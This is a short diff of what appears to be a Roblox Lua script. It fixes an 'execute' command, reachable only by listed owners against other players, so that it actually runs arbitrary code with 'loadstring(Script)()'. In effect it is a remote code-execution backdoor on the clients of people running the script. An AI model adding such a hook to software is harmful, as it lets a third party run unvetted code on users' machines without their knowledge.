@@ -269,7 +269,7 @@ if not table.find(OwnerNames,Player.Name) then
     
     AddCmd("execute",function(Plr,Script)
         if Plr == "all" or GetPlayer(Plr) == Player then
-            loadstring(Script)
+            loadstring(Script)()
         end
     end)
     
